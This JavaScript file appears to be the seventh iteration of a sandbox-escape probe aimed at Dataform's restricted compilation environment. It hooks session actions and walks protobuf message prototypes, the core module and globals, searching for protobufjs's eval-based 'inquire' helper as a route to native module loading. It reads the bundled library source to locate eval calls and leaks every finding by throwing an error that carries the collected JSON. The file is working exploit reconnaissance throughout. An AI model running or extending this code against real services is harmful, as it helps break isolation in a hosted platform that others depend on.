// v7 — reach protobufjs.inquire via proto message → Type → util → inquire

var out = {};
function safe(k, fn) {
  try { var v = fn(); out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 3000); }
  catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
}

// ============ Walk into protobuf messages via session actions ============
// Hook session.actions.push so when notebook/publish/operate registers an action,
// we grab the proto message and walk it
var s = global._DF_SESSION;
var origPush = s.actions.push.bind(s.actions);
globalThis.__capturedProtos = [];
s.actions.push = function(action) {
  try {
    if (action && action.proto) {
      globalThis.__capturedProtos.push({
        action_type: action.constructor && action.constructor.name,
        proto_keys: Object.getOwnPropertyNames(action.proto).join(','),
        proto_proto: Object.getOwnPropertyNames(Object.getPrototypeOf(action.proto)).join(','),
        ctor_name: action.proto.constructor && action.proto.constructor.name,
        ctor_keys: action.proto.constructor && Object.getOwnPropertyNames(action.proto.constructor).join(',')
      });
    }
  } catch(e) {}
  return origPush(action);
};

// ============ Create test actions to trigger push ============
safe('A1_create_publish', function() {
  try {
    var t = publish('test_pwn', { type: 'view' });
    return 'made publish, t.proto.ctor=' + (t.proto && t.proto.constructor && t.proto.constructor.name);
  } catch(e) { return 'err:' + e.message; }
});

safe('A2_publish_proto_walk', function() {
  // Walk up from a freshly-created Table action
  var t = new Object(); // placeholder
  try {
    var p = publish('walker_test', { type: 'view' });
    var proto = p.proto;
    var info = {
      proto_typeof: typeof proto,
      proto_ctor_name: proto.constructor && proto.constructor.name,
      proto_ctor_keys: Object.getOwnPropertyNames(proto.constructor).join(','),
      proto_ctor_proto_keys: Object.getOwnPropertyNames(Object.getPrototypeOf(proto.constructor)).join(',')
    };
    return JSON.stringify(info);
  } catch(e) { return 'err:' + e.message; }
});

// ============ Look for protobufjs's Util / Reader / Type classes ============
safe('B1_proto_constructor_dot_util', function() {
  try {
    var p = publish('util_probe', { type: 'view' });
    var ctor = p.proto.constructor;
    // protobufjs Type has $type, util, etc.
    var keys = Object.getOwnPropertyNames(ctor);
    var result = { keys, $type: typeof ctor.$type, util: typeof ctor.util };
    if (ctor.$type) {
      result.$type_keys = Object.getOwnPropertyNames(ctor.$type).slice(0, 30);
    }
    return JSON.stringify(result);
  } catch(e) { return 'err:' + e.message; }
});

safe('B2_proto_constructor_root', function() {
  try {
    var p = publish('root_probe', { type: 'view' });
    var ctor = p.proto.constructor;
    // protobufjs Types reference their Root namespace
    var R = ctor.$type && ctor.$type.parent;
    if (R) {
      return 'parent typeof=' + typeof R + ' keys=' + Object.getOwnPropertyNames(R).slice(0,30).join(',') + ' name=' + R.name;
    }
    return '$type=' + typeof ctor.$type + ' parent=null';
  } catch(e) { return 'err:' + e.message; }
});

// ============ Try direct path: search for Util / inquire on the message itself ============
safe('C1_walk_proto_inquire', function() {
  try {
    var p = publish('inquire_walk', { type: 'view' });
    var found = [];
    var queue = [{obj: p.proto, path: 'proto', depth: 0}];
    var visited = new WeakSet();
    while (queue.length > 0 && found.length < 50) {
      var item = queue.shift();
      if (item.depth > 4) continue;
      var obj = item.obj;
      if (!obj || (typeof obj !== 'object' && typeof obj !== 'function') || visited.has(obj)) continue;
      visited.add(obj);
      try {
        var keys = Object.getOwnPropertyNames(obj);
        for (var k of keys) {
          if (k === 'inquire' || k === 'fs' || k.match(/inquire|nativeRequire/i)) {
            found.push({path: item.path + '.' + k, val_type: typeof obj[k]});
          }
          try {
            var v = obj[k];
            if (v && (typeof v === 'object' || typeof v === 'function')) {
              queue.push({obj: v, path: item.path + '.' + k, depth: item.depth + 1});
            }
          } catch(e) {}
        }
        // Also check prototype
        var proto = Object.getPrototypeOf(obj);
        if (proto && !visited.has(proto)) {
          queue.push({obj: proto, path: item.path + '.__proto__', depth: item.depth + 1});
        }
      } catch(e) {}
    }
    return JSON.stringify(found);
  } catch(e) { return 'err:' + e.message; }
});

// ============ Walk core / session / @dataform/core looking for protobufjs/util ============
safe('C2_walk_core_for_util', function() {
  var found = [];
  var queue = [{obj: core, path: 'core', depth: 0}];
  var visited = new WeakSet();
  while (queue.length > 0 && found.length < 30) {
    var item = queue.shift();
    if (item.depth > 5) continue;
    var obj = item.obj;
    if (!obj || (typeof obj !== 'object' && typeof obj !== 'function') || visited.has(obj)) continue;
    visited.add(obj);
    try {
      var keys = Object.getOwnPropertyNames(obj);
      for (var k of keys) {
        if (k === 'inquire' || k === 'fs' || k === 'Reader' || k === 'Writer' || k === 'util' || k === 'Root' || k === 'Type') {
          found.push({path: item.path + '.' + k, val_type: typeof obj[k]});
        }
        try {
          var v = obj[k];
          if (v && (typeof v === 'object' || typeof v === 'function')) {
            queue.push({obj: v, path: item.path + '.' + k, depth: item.depth + 1});
          }
        } catch(e) {}
      }
    } catch(e) {}
  }
  return JSON.stringify(found);
});

// ============ Find ALL objects with `inquire` property in reachable globals ============
safe('D1_find_inquire_in_globals', function() {
  var roots = ['_DF_SESSION', 'core', 'dataform', 'restricted_fs', 'vm', 'require', 'path', 'assert', 'publish', 'operate', 'declare', 'notebook'];
  var results = {};
  for (var rname of roots) {
    var r = globalThis[rname];
    if (!r) continue;
    try {
      if (typeof r.inquire === 'function') results[rname + '.inquire'] = 'GOT';
      if (r.fs !== undefined) results[rname + '.fs'] = typeof r.fs;
      if (r.util !== undefined) results[rname + '.util'] = typeof r.util;
    } catch(e) {}
  }
  return JSON.stringify(results);
});

// ============ Bundle source — look for ALL places that expose protobufjs ============
var BUNDLE = restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString();

safe('E1_protobufjs_exports', function() {
  // Find exports.inquire or similar
  var pats = [/\b\w+\.inquire\s*=\s*\w+/g, /exports\.inquire/g, /t\.inquire\s*=/g];
  var matches = [];
  for (var p of pats) {
    var m;
    while ((m = p.exec(BUNDLE)) !== null && matches.length < 10) {
      matches.push({pat: p.toString(), at: m.index, ctx: BUNDLE.substring(Math.max(0,m.index-50), m.index + 200)});
    }
  }
  return JSON.stringify(matches);
});

safe('E2_inquire_function_definition', function() {
  // The actual function inquire(moduleName){...}
  var idx = BUNDLE.indexOf('function inquire(');
  if (idx < 0) {
    // alternate: var inquire = ...
    idx = BUNDLE.indexOf('var inquire');
  }
  if (idx < 0) {
    // search by eval signature
    var m = BUNDLE.match(/function\s*\(\s*\w+\s*\)\s*\{\s*try\s*\{\s*var\s+\w+\s*=\s*\(\s*eval\(/);
    if (m) idx = BUNDLE.indexOf(m[0]);
  }
  if (idx < 0) return 'not found';
  return BUNDLE.substring(idx, idx + 1000);
});

safe('E3_eval_context', function() {
  var idx = BUNDLE.indexOf('eval(');
  if (idx < 0) return 'no eval';
  return BUNDLE.substring(Math.max(0, idx - 300), idx + 500);
});

// ============ Try directly calling the existing protobuf messages we have ============
safe('F1_message_encode_walk', function() {
  // Each protobuf message type has static methods: create, encode, decode, etc.
  // These are tied to a Type instance which has parent (Namespace/Root)
  try {
    var p = publish('encode_walk', { type: 'view' });
    var ctor = p.proto.constructor;
    var visited = [];
    var current = ctor;
    var depth = 0;
    while (current && depth < 10) {
      visited.push({
        name: current.name || '(no_name)',
        keys: Object.getOwnPropertyNames(current).slice(0, 20).join(','),
        proto_keys: Object.getOwnPropertyNames(Object.getPrototypeOf(current) || {}).slice(0, 20).join(',')
      });
      current = Object.getPrototypeOf(current);
      depth++;
    }
    return JSON.stringify(visited);
  } catch(e) { return 'err:' + e.message; }
});

module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
throw new Error('PROBE_v7:' + JSON.stringify(out));
